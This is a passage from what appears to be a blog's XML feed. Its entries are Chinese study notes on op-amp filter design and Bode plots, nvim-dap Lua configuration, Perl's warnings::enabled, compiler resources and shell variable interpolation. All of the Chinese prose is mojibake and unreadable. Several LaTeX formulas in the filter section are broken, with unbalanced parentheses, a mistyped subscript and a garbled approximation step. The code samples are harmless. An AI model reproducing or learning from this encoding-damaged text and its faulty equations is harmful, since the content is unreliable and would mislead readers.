<mark>ç”µå‹ä¹‹æ¯”</mark> æˆ– <mark>ç”µæµä¹‹æ¯”</mark> :</p><p>æ¯•ç«Ÿ</p><p>$$<br>\displaylines{ \frac{p_o}{p_i} &#x3D; \frac{v^2_{out}&#x2F;R_L}{v^2_{in}&#x2F;R_{in}} &#x3D; ( \frac{v_{out}}{v_{in}})^2 \newline~ \newline<br>\frac{p_o}{p_i} &#x3D; \frac{i^2_{out} R_L}{i^2_{in} R_{in}} &#x3D; ( \frac{i_{out}}{i_{in}})^2}<br>$$</p><p>(è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºä¸ºä»€ä¹ˆ 10 å€å˜æˆäº† 20 å€, å› ä¸ºæœ‰ä¸ªå¹³æ–¹, æ‹¿å‡ºå¯¹æ•°åå˜æˆ 2)</p><p>å› æ­¤:</p><p>$$<br>\displaylines{åˆ†è´æ•° &#x3D; 20 \lg \frac{v_{out}}{v_{in}} \newline~ \newline<br>&#x3D; 20 \lg \frac{i_{out}}{i_{in}}}<br>$$</p><h3 id="15-1-1-å…³äºé¢‘ç‡å“åº”æ›²çº¿çš„çŸ¥è¯†"><a href="#15-1-1-å…³äºé¢‘ç‡å“åº”æ›²çº¿çš„çŸ¥è¯†" class="headerlink" title="15.1.1 å…³äºé¢‘ç‡å“åº”æ›²çº¿çš„çŸ¥è¯†"></a>15.1.1 å…³äºé¢‘ç‡å“åº”æ›²çº¿çš„çŸ¥è¯†</h3><p>ä¸¤ä¸ªæ›²çº¿:</p><ul><li>è½¬ç§»å‡½æ•°çš„å¹…é¢‘ç‰¹æ€§æ›²çº¿ </li><li>è½¬ç§»å‡½æ•°çš„ç›¸é¢‘ç‰¹æ€§æ›²çº¿</li></ul><p>é€šå¸¸ç”»åœ¨åŒä¸€ä¸ªå¹³é¢ä¸Š, å…±ç”¨é¢‘ç‡è½´.</p><p><mark>ä¼¯å¾·å›¾</mark> ç‰¹ç‚¹:</p><ol><li>ä½¿ç”¨é¢‘ç‡çš„å¯¹æ•°åæ ‡</li><li>ä»¥åˆ†è´ (dB) ä¸ºçºµè½´, ä»¥é¢‘ç‡çš„å¯¹æ•°ä¸ºæ¨ªè½´, å¦‚æœè½¬ç§»å‡½æ•°çš„å¹…å€¼ä¸º $\left\vert H(j \omega) \right\vert$, å…¶åˆ†è´å€¼ä¸º:<br>$$<br>\displaylines{ A_{dB} &#x3D; 20 \lg \left\vert H(j \omega) \right\vert}<br>$$<br>($\left\vert H(j \omega) \right\vert$ å°±æ˜¯è¾“å‡ºç”µå‹ä¸è¾“å…¥ç”µå‹ä¹‹æ¯”, ä¸”æ³¨æ„è¿™é‡Œæœ‰å•ä½ dB)</li></ol><p>å‡ ä¸ªç»“è®º:</p><p>$A_{dB} &#x3D; 0$ æ—¶, è½¬ç§»å‡½æ•°çš„å¹…å€¼ä¸º 1 ( $20 \lg(1) &#x3D; 0$)</p><p>$A_{dB} &lt; 0$ æ—¶, è½¬ç§»å‡½æ•°çš„å¹…å€¼åœ¨ $0 \sim 1$ ä¹‹é—´.</p><p>$A_{dB} &gt; 0$ æ—¶, è½¬ç§»å‡½æ•°çš„å¹…å€¼å¤§äº 1.</p><p>$20 \lg \left\vert 1&#x2F;\sqrt{2} \right\vert &#x3D; -3 dB$, è¡¨æ˜, æˆªæ­¢é¢‘ç‡æ—¶çš„åˆ†è´æ¯”æœ€å¤§å¹…å€¼æ—¶çš„åˆ†è´å° $3 dB$, æ¯”å¦‚æœ€å¤§ä¸º $26dB$, åˆ™æˆªæ­¢é¢‘ç‡æ—¶ä¸º $26 - 3 &#x3D; 23 dB$</p><h3 id="15-1-2-ä¸€é˜¶é«˜é€šæ»¤æ³¢å™¨"><a href="#15-1-2-ä¸€é˜¶é«˜é€šæ»¤æ³¢å™¨" class="headerlink" title="15.1.2 ä¸€é˜¶é«˜é€šæ»¤æ³¢å™¨"></a>15.1.2 ä¸€é˜¶é«˜é€šæ»¤æ³¢å™¨</h3><p>å¦‚å›¾:</p><p><img src="/../img/first_order_high_pass_filter.png"></p><p>æ­¤æ—¶çš„<mark>è¾“å…¥é˜»æŠ—</mark>ä¸º $R_1$ å’Œ $C$ çš„ä¸²è”, <mark>è¾“å‡ºé˜»æŠ—</mark> ä¸ºåé¦ˆé€šé“çš„ $R_2$.</p><p>è½¬ç§»å‡½æ•°ä¸º:<br>$$<br>\displaylines{H(s) &#x3D; - \frac{Z_f}{Z_i} &#x3D; \frac{-R_2}{R_1 + \frac{1}{sC}} &#x3D; - K \frac{s}{s + \omega_c} \newline~ \newline<br>K &#x3D; \frac{R_2}{R_1} \newline~ \newline<br>\omega_c &#x3D; \frac{1}{R_1 C}}<br>$$</p><h2 id="15-2-æ¯”ä¾‹å˜æ¢"><a href="#15-2-æ¯”ä¾‹å˜æ¢" class="headerlink" title="15.2 æ¯”ä¾‹å˜æ¢"></a>15.2 æ¯”ä¾‹å˜æ¢</h2><p><mark>æ¯”ä¾‹å˜æ¢</mark>, å³å…ˆç”¨ä¾¿åˆ©çš„å…ƒä»¶æ•°å€¼è¿›è¡Œè®¡ç®—, æœ€åå†æ¢ç®—æˆå®é™…å€¼.</p><p>æœ‰ä¸¤ç§æ¯”ä¾‹è®¡ç®—:</p><ul><li>å¹…å€¼</li><li>é¢‘ç‡</li></ul><p><mark>å¹…å€¼æ¯”ä¾‹å˜æ¢</mark>:  åœ¨ <mark>ç»™å®šé¢‘ç‡ä¸‹</mark> å°† <mark>é˜»æŠ—</mark> ä¹˜ä»¥ä¸€ä¸ªæ¯”ä¾‹ç³»æ•° $k_m$, åˆ™æœ‰:<br>$$<br>\displaylines{R^\prime &#x3D; k_m R,\ L^\prime &#x3D; k_m L,\ C^\prime &#x3D; C&#x2F;k_m}<br>$$</p><p><mark>é¢‘ç‡æ¯”ä¾‹å˜æ¢</mark>: </p><p>$$<br>\displaylines{R^\prime &#x3D; R,\ L^\prime &#x3D;  L&#x2F;k_f,\ C^\prime &#x3D; C&#x2F;k_f}<br>$$</p><p><mark>åŒæ—¶å˜æ¢</mark> (å°±ç»“æœè€Œè¨€å°±æ˜¯ä¸Šé¢ä¸¤ä¸ªä¹˜åœ¨ä¸€èµ·):</p><p>$$<br>\displaylines{R^\prime &#x3D; k_m R,\ L^\prime &#x3D; \frac{k_m}{k_f} L,\ C^\prime &#x3D; \frac{1}{k_m k_f} C}<br>$$</p><h3 id="15-2-1-æ¯”ä¾‹å˜æ¢åœ¨è¿æ”¾æ»¤æ³¢å™¨è®¾è®¡ä¸­çš„åº”ç”¨"><a href="#15-2-1-æ¯”ä¾‹å˜æ¢åœ¨è¿æ”¾æ»¤æ³¢å™¨è®¾è®¡ä¸­çš„åº”ç”¨" class="headerlink" title="15.2.1 æ¯”ä¾‹å˜æ¢åœ¨è¿æ”¾æ»¤æ³¢å™¨è®¾è®¡ä¸­çš„åº”ç”¨"></a>15.2.1 æ¯”ä¾‹å˜æ¢åœ¨è¿æ”¾æ»¤æ³¢å™¨è®¾è®¡ä¸­çš„åº”ç”¨</h3><h2 id="15-3-è¿æ”¾å¸¦é€šå’Œå¸¦é˜»æ»¤æ³¢å™¨"><a href="#15-3-è¿æ”¾å¸¦é€šå’Œå¸¦é˜»æ»¤æ³¢å™¨" class="headerlink" title="15.3 è¿æ”¾å¸¦é€šå’Œå¸¦é˜»æ»¤æ³¢å™¨"></a>15.3 è¿æ”¾å¸¦é€šå’Œå¸¦é˜»æ»¤æ³¢å™¨</h2><h3 id="15-3-1-è¿æ”¾å¸¦é€šæ»¤æ³¢å™¨"><a href="#15-3-1-è¿æ”¾å¸¦é€šæ»¤æ³¢å™¨" class="headerlink" title="15.3.1 è¿æ”¾å¸¦é€šæ»¤æ³¢å™¨"></a>15.3.1 è¿æ”¾å¸¦é€šæ»¤æ³¢å™¨</h3><p>å¸¦é€šæ»¤æ³¢å™¨å¯ä»¥åˆ†æˆä¸‰ä¸ªç‹¬ç«‹çš„éƒ¨åˆ†:</p><ol><li>å•ä½æ”¾å¤§å€æ•°çš„ <mark>ä½é€šæ»¤æ³¢å™¨</mark>, æˆªæ­¢é¢‘ç‡ä¸º $\omega_{c2}$, ä¸”ä¸ºä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¸­çš„è¾ƒå¤§è€…</li><li>å•ä½æ”¾å¤§å€æ•°çš„ <mark>é«˜é€šæ»¤æ³¢å™¨</mark>, æˆªæ­¢é¢‘ç‡ä¸º $\omega_{c1}$, ä¸”ä¸ºä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¸­çš„è¾ƒå°è€… </li><li>æ”¾å¤§éƒ¨åˆ†</li></ol><p>ä¸‰ä¸ªéƒ¨åˆ†æ˜¯çº§è”çš„.</p><p><img src="/../img/source_band_pass_filter_circuit.png"></p><p>å®½å¸¦æ»¤æ³¢å™¨çš„ä¸€èˆ¬å®šä¹‰è¦æ±‚ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡æ»¡è¶³:<br>$$<br>\displaylines{ \frac{\omega_{c2}}{\omega_{c1}} \ge 2}<br>$$</p><p>è¿˜æœ‰ä¸€ä¸ªè¦æ±‚: åœ¨ä½é€šæ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡å¤„, é«˜é€šæ»¤æ³¢å™¨çš„å¹…å€¼ä¸º 1, åœ¨é«˜é€šæ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡å¤„, ä½é€šæ»¤æ³¢å™¨çš„å¹…å€¼ä¸º 1.</p><p><mark>çº§è”å¸¦é€šæ»¤æ³¢å™¨çš„è½¬ç§»å‡½æ•°</mark> æ˜¯ä¸‰ä¸ªçº§è”ç”µè·¯è½¬ç§»å‡½æ•°ä¹‹ç§¯.</p><p>$$<br>\displaylines{H(s) &#x3D; \frac{V_o}{V_i} \newline~ \newline<br>&#x3D; ( \frac{-\omega_{c2}}{s + \omega_{c2}) ( \frac{-s}{s + \omega_{c1}}) ( \frac{- R_f}{R_i}) \newline~ \newline<br>&#x3D; \frac{-K \omega_{c2} s}{(s + \omega_{ci}) (s + \omega_{c2})} \newline~ \newline<br>&#x3D; \frac{-K \omega_{c2} s}{s^2 + (\omega_{c1} + \omega_{c2}) s + \omega_{c1} \omega_{c2}}<br>$$<br>(ä¸ºä¹˜ç§¯ä¹Ÿå¾ˆå¥½ç†è§£, éœ€è¦çš„åŒæ ·æ˜¯è¾“å…¥ç”µå‹å’Œè¾“å‡ºç”µå‹ä¹‹æ¯”, ç›¸å½“äº: $H(s) &#x3D; \frac{V_1}{V_i} \frac{V_2}{V_1} \frac{V_o}{V_2}$)</p><p>è¿™é‡Œçš„å€¼å¯ä»¥å¦å–åä¸º:<br>$$<br>\displaylines{H_{BP} &#x3D; \frac{\beta s}{s^2 + \beta s + \omega_o^2}}<br>$$</p><p>è‹¥è¦å°†å…¶è½¬æ¢ä¸ºå¸¦é€šæ»¤æ³¢å™¨è½¬ç§»å‡½æ•°çš„æ ‡å‡†å½¢å¼ (æ ‡å‡†å½¢å¼æ˜¯ä»€ä¹ˆ ?), éœ€è¦:<br>$$<br>\displaylines{\omega_{c2} \gg \omega_{c1} \newline~ \newline<br>åˆ™: \newline~ \newline<br>(\omega_{c1} + \omega_{c2}) \approx \omega_{c2} \approx \omega_{c2}) \newline~ \newline<br>æœ€ç»ˆå¾—: \newline~ \newline<br>&#x3D; \frac{-K \omega_{c2} s}{s^2 + (\omega_{c2}) s + \omega_{c1} \omega_{c2}}<br>}<br>$$</p><p>çº§è”ä¸­çš„ä¸‰ä¸ªç”µè·¯éœ€åˆ†åˆ«æ»¡è¶³ä¸€äº›è¦æ±‚.</p><blockquote><p>ä½é€šæ»¤æ³¢å™¨ä¸­ $R_L\ å’Œ\ C_L$ éœ€æ»¡è¶³:</p></blockquote><p>$$<br>\displaylines{\omega_{c2} &#x3D; \frac{1}{R_L C_L}}<br>$$</p><blockquote><p>é«˜é€šæ»¤æ³¢å™¨ä¸­ $R_H\ å’Œ\ C_H$ éœ€æ»¡è¶³:</p></blockquote><p>$$<br>\displaylines{\omega_{c1} &#x3D; \frac{1}{R_H C_H}}<br>$$</p><blockquote><p>åç›¸æ”¾å¤§å™¨ä¸­çš„ $R_i\ å’Œ\ R_f$ éœ€æ»¡è¶³:</p></blockquote><p>å…ˆå¸¦é€šæ»¤æ³¢å™¨è½¬ç§»å‡½æ•°åœ¨ä¸­å¿ƒé¢‘ç‡ $\omega_o$ æ—¶çš„å¹…å€¼ (ä¸åªè¿™é‡Œä¸ºä»€ä¹ˆè¦æ±‚):</p><p>$$<br>\displaylines{ \left\vert H(j \omega_o) \right\vert &#x3D; \left\vert \frac{- K \omega_{c2} (j \omega_o)}{(j \omega_o)^2 + \omega_{c2} (j \omega_{0}) + \omega_{c1} \omega_{c2}} \right\vert \newline~ \newline<br>&#x3D; \frac{K \omega_{c2}}{\omega_{c2}} \newline~ \newline<br>&#x3D; K}<br>$$</p><p>$$<br>\displaylines{ \left\vert H(j \omega_o) \right\vert &#x3D; \frac{R_f}{R_i}}<br>$$</p><h3 id="15-3-2-è¿æ”¾å¸¦é˜»æ»¤æ³¢å™¨"><a href="#15-3-2-è¿æ”¾å¸¦é˜»æ»¤æ³¢å™¨" class="headerlink" title="15.3.2 è¿æ”¾å¸¦é˜»æ»¤æ³¢å™¨"></a>15.3.2 è¿æ”¾å¸¦é˜»æ»¤æ³¢å™¨</h3><p>åŒæ ·åˆ†ä¸ºä¸‰ä¸ªç‹¬ç«‹å•å…ƒ, ç‰¹ç‚¹ä¸º:</p><ol><li>å•ä½æ”¾å¤§ <mark>ä½é€š</mark> æ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡ä¸º $\omega_{c1}$, å®ƒæ˜¯ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¸­ <mark>è¾ƒå°</mark> çš„</li><li>å•ä½æ”¾å¤§ <mark>é«˜é€š</mark> æ»¤æ³¢å™¨çš„æˆªæ­¢é¢‘ç‡ä¸º $\omega_{c2}$, å®ƒæ˜¯ä¸¤ä¸ªæˆªæ­¢é¢‘ç‡ä¸­ <mark>è¾ƒå¤§</mark> çš„</li><li><mark>æ”¾å¤§å•å…ƒ</mark>äº§ç”Ÿè¦æ±‚çš„é€šå¸¦æ”¾å¤§ç³»æ•°</li></ol><p>ç”µè·¯å¦‚ä¸‹:</p><p><img src="/../img/para_op_amp_elimination_filter.png"></p><p><mark>å’Œè¿æ”¾å¸¦é€šæ»¤æ³¢å™¨çš„é‡è¦å·®åˆ«</mark>: è¿™ä¸‰ä¸ªå•å…ƒä¸èƒ½çº§è”, è€Œæ˜¯ç”¨å¹¶è”å’Œæ±‚å’Œæ”¾å¤§å™¨å®ç°.</p><h3 id="é™„å½•-E-ä¼¯å¾·å›¾"><a href="#é™„å½•-E-ä¼¯å¾·å›¾" class="headerlink" title="é™„å½• E ä¼¯å¾·å›¾"></a>é™„å½• E ä¼¯å¾·å›¾</h3><p>éœ€è¦çŸ¥é“ <mark>é›¶æç‚¹</mark>.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-nvim-dap</title>
    <link href="/2023/01/29/%E5%85%B3%E4%BA%8E-nvim-dap/"/>
    <url>/2023/01/29/%E5%85%B3%E4%BA%8E-nvim-dap/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-h-dap-txt"><a href="#å‚è€ƒ-h-dap-txt" class="headerlink" title="å‚è€ƒ h dap.txt."></a>å‚è€ƒ <code>h dap.txt</code>.</h1><p>nvim-dap æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ (client), éœ€è¦å®‰è£…æ˜¯ä¸€ä¸ª debug adapter (é€‚é…å™¨), æ¥å’ŒæŒ‡å®šè¯­è¨€çš„ debugger å¯¹æ¥ (server).</p><p><img src="/../img/nvim-dap-relation.png"></p><p>nvim-dap å’Œ debug adapter ä¹‹é—´é€šè¿‡ Debug Adapter Protocol äº¤æµ.</p><p>ä¸ºäº†å¼€å§‹ debug, æ¯ä¸ªè¯­è¨€éœ€è¦é…ç½®ä¸¤ä¸ªä¸œè¥¿:</p><ul><li>a debug adapter (dap-adapter)</li><li>å¦‚ä½•å°† debugger è¿æ¥åˆ°åº”ç”¨ (dap-configuration)</li></ul><p>å¯ä»¥åœ¨ <a href="https://microsoft.github.io/debug-adapter-protocol/implementors/adapters/">è¿™ä¸ªç½‘ç«™è·å– debug adapters</a>.</p><p>Debug adapter çš„é…ç½®å’Œå®‰è£…æŒ‡å¯¼, è§ <a href="https://github.com/mfussenegger/nvim-dap/wiki/Debug-Adapter-installation">è¿™ä¸ªç½‘ç«™</a></p><p><a href="https://microsoft.github.io/debug-adapter-protocol/">Debug Adapter Protocol çš„å®˜ç½‘</a></p><h2 id="dap-adapter-æ¡ç›®"><a href="#dap-adapter-æ¡ç›®" class="headerlink" title="dap-adapter æ¡ç›®"></a>dap-adapter æ¡ç›®</h2><p>dap-adapter å¯ä»¥é€šè¿‡ nvim ä¸‹è½½, ä¹Ÿå¯ä»¥ç›´æ¥è¿æ¥åˆ°ä¸€ä¸ªå·²å­˜åœ¨çš„ä¸Š.</p><p>ç”¨ <code>dap.adapters</code> è¿™ä¸ªè¡¨æ¥é…ç½® nvim çš„ debug adapters.</p><p>å¦‚, é…ç½® python çš„ debug adapter:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> dap = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dap&#x27;</span>)<br>dap.adapters.python = &#123;<br>  <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;executable&#x27;</span>;<br>  command = <span class="hljs-built_in">os</span>.<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&#x27;HOME&#x27;</span>) .. <span class="hljs-string">&#x27;/.virtualenvs/tools/bin/python&#x27;</span>;<br>  args = &#123; <span class="hljs-string">&#x27;-m&#x27;</span>, <span class="hljs-string">&#x27;debugpy.adapter&#x27;</span> &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>type</code> åŒ…æ‹¬:</p><ul><li>executable, æš—ç¤ºéœ€è¦ä¸‹è½½, æ–‡æ¡£ä¸­è¿˜æœ‰å…¶ç›¸å…³çš„å‘½ä»¤</li><li>server, æš—ç¤ºç›´æ¥è¿æ¥å·²å­˜åœ¨çš„, æ–‡æ¡£ä¸­è¿˜æœ‰å…¶ç›¸å…³çš„å‘½</li></ul><h2 id="dap-configuration-æ¡ç›®"><a href="#dap-configuration-æ¡ç›®" class="headerlink" title="dap-configuration æ¡ç›®"></a>dap-configuration æ¡ç›®</h2><p>é…ç½®æ˜¯ä¸ºäº†, å¯åŠ¨å’Œè¿æ¥ debug adapter.</p><p>é…ç½®å†™åœ¨ <code>dap.configurations</code> è¡¨ä¸­, è¿è¡Œ <code>dap-continue</code>, nvim å°±ä¼šå¯»æ‰¾å½“å‰æ–‡ä»¶ç±»å‹çš„é…ç½®.</p><p>å¦‚, python é…ç½®:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> dap = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dap&#x27;</span>)<br>dap.configurations.python = &#123;<br>  &#123;<br>    <span class="hljs-built_in">type</span> = <span class="hljs-string">&#x27;python&#x27;</span>;<br>    request = <span class="hljs-string">&#x27;launch&#x27;</span>;<br>    name = <span class="hljs-string">&quot;Launch file&quot;</span>;<br>    program = <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>;<br>    pythonPath = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">()</span></span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;/usr/bin/python&#x27;</span><br>    <span class="hljs-keyword">end</span>;<br>  &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>å‡ ä¸ªé”®å­—çš„å«ä¹‰:</p><ul><li><code>type</code>, å†³å®šä½¿ç”¨å“ªä¸ª debug adapter</li><li><code>request</code>, <code>attach</code> è¡¨æ˜éœ€è¦è¿æ¥åˆ°æŸä¸ªç¨‹åº, <code>launch</code> è¡¨æ˜éœ€è¦å¯åŠ¨ä¸€ä¸ª debugee</li><li><code>name</code>, ä¼¼ä¹éšä¾¿å–</li></ul><p>æœ‰ä¸€äº›ç‰¹æ®Šå˜é‡å¯ç”¨:</p><ul><li><code>$&#123;file&#125;</code>: Active filename<ul><li><code>$&#123;fileBasename&#125;</code>: The current fileâ€™s basename</li><li><code>$&#123;fileBasenameNoExtension&#125;</code>: The current fileâ€™s basename without extension</li><li><code>$&#123;fileDirname&#125;</code>: The current fileâ€™s dirname</li><li><code>$&#123;fileExtname&#125;</code>: The current fileâ€™s extension</li><li><code>$&#123;relativeFile&#125;</code>: The current file relative to |getcwd()|</li><li><code>$&#123;relativeFileDirname&#125;</code>: The current fileâ€™s dirname relative to |getcwd()|</li><li><code>$&#123;workspaceFolder&#125;</code>: The current working directory of Neovim</li><li><code>$&#123;workspaceFolderBasename&#125;</code>: The name of the folder opened in Neovim</li><li><code>$&#123;command:pickProcess&#125;</code>: Open dialog to pick process using |vim.ui.select|</li><li><code>$&#123;env:Name&#125;</code>: Environment variable named <code>Name</code>, for example: <code>$&#123;env:HOME&#125;</code>.</li></ul></li></ul><h1 id="å‚è€ƒç½‘é¡µ"><a href="#å‚è€ƒç½‘é¡µ" class="headerlink" title="å‚è€ƒç½‘é¡µ"></a><a href="https://davelage.com/posts/nvim-dap-getting-started/">å‚è€ƒç½‘é¡µ</a></h1><p><code>nvim-dap-ui</code> æ’ä»¶ä¸º <code>nvim-dap</code> æä¾›äº† UI ç•Œé¢. <code>:h dapui.setup()</code> å¯æŸ¥çœ‹é…ç½®.</p><p>UI ç•Œé¢çš„ toggle æ˜¯ <code>require(&quot;dapui&quot;).toggle()</code></p><p>æ‰“å¼€ Floating Elements ä¸º <code>require(&quot;dapui&quot;).float_element(&lt;element ID&gt;, &lt;optional setting&gt;)</code></p><p>æ˜¾ç¤ºå€¼: <code>require(&quot;dapui&quot;).eval(&lt;expression&gt;)</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-ä¸­çš„-warnings-enabled-å‡½æ•°</title>
    <link href="/2023/01/29/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E7%9A%84-warnings-enabled-%E5%87%BD%E6%95%B0/"/>
    <url>/2023/01/29/%E5%85%B3%E4%BA%8E-Perl-%E4%B8%AD%E7%9A%84-warnings-enabled-%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<p>é¦–å…ˆå°†ä¸€ä¸ªæ¨¡å—æ³¨å†Œåˆ° <code>warnings::register</code> ä¸­. è¿™æ ·è¿™ä¸ªæ¨¡å—æ‰èƒ½ä½¿ç”¨ <code>warnings::enabled</code> å‡½æ•°.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> warnings::register;<br></code></pre></td></tr></table></figure><p>åœ¨æ³¨å†Œçš„æ¨¡å—æœ¬èº«ä¸­è¿è¡Œ <code>warnings::enabled</code> ä¼¼ä¹ä¸è¡Œ.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Test::Warning;<br><span class="hljs-keyword">use</span> warnings::register;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Warning</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;You can Warning!&quot;</span> <span class="hljs-keyword">if</span> warnings::enabled();<br>&#125;<br><br><span class="hljs-comment"># è¿è¡Œæ—¶æ— å†…å®¹æ‰“å‡º</span><br>Warning();<br></code></pre></td></tr></table></figure><p>ä½†åœ¨å…¶ä»– Perl è„šæœ¬ä¸­ä½¿ç”¨å¯è¡Œ, å¯ç”¨ <code>use warnings;</code> æ¥æ”¹å˜å…¶è¿”å›å€¼</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::Warning;<br><span class="hljs-keyword">use</span> warnings;<br><br>Test::Warning::Warning();<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–è¯‘åŸç†-éšåšå®¢å­¦ä¹ -Notes</title>
    <link href="/2023/01/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E9%9A%8F%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0-Notes/"/>
    <url>/2023/01/29/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86-%E9%9A%8F%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h1><p><a href="https://ruslanspivak.com/lsbasi-part1/">å‚è€ƒ</a></p><h2 id="Letâ€™s-Build-A-Simple-Interpreter-Part-1"><a href="#Letâ€™s-Build-A-Simple-Interpreter-Part-1" class="headerlink" title="Letâ€™s Build A Simple Interpreter. Part 1"></a>Letâ€™s Build A Simple Interpreter. Part 1</h2><p><mark>ä»€ä¹ˆæ˜¯ Interpreter (è§£é‡Šå™¨) å’Œ compiler (ç¼–è¯‘å™¨)</mark>: å°†é«˜çº§è¯­è¨€çš„æºä»£ç ç¿»è¯‘ä¸ºå…¶ä»–å½¢å¼.</p><p><mark>ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨çš„åŒºåˆ«</mark>:</p><ul><li>å¦‚æœä¸€ä¸ªç¿»è¯‘å™¨å°†æºä»£ç ç¿»è¯‘ä¸ºæœºæ¢°è¯­è¨€, å°±<mark>ç¼–è¯‘å™¨ (compiler)</mark>æ˜¯</li><li>å¦‚æœä¸€ä¸ªç¿»è¯‘å™¨å°†æºä»£ç ç›´æ¥è¿è¡Œ, å°±æ˜¯ <mark>è§£é‡Šå™¨ (interpreter)</mark></li></ul><p><img src="/../img/diff_of_compiler_and_interpreter.png"></p><h1 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h1><p><a href="http://www.craftinginterpreters.com/">å‚è€ƒ</a></p><h1 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h1><p><a href="https://github.com/shiyi001/PL0Compiler">å‚è€ƒ</a></p>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ShellScript-æŠ€å·§ç§¯ç´¯</title>
    <link href="/2023/01/28/ShellScript-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/"/>
    <url>/2023/01/28/ShellScript-%E6%8A%80%E5%B7%A7%E7%A7%AF%E7%B4%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="å˜é‡å†…æ’"><a href="#å˜é‡å†…æ’" class="headerlink" title="å˜é‡å†…æ’"></a>å˜é‡å†…æ’</h1><p>ç›´æ¥å†™æˆ <code>$&#123;Varname&#125;</code> å°±å¯ä»¥, å¦‚:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">Test=<span class="hljs-string">&quot;A string&quot;</span><br>Haha=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;Test&#125;</span>&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;Haha&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Shell</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-æœ€ä½³å®è·µ-Notes</title>
    <link href="/2023/01/24/Perl-%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-Notes/"/>
    <url>/2023/01/24/Perl-%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-Notes/</url>
    
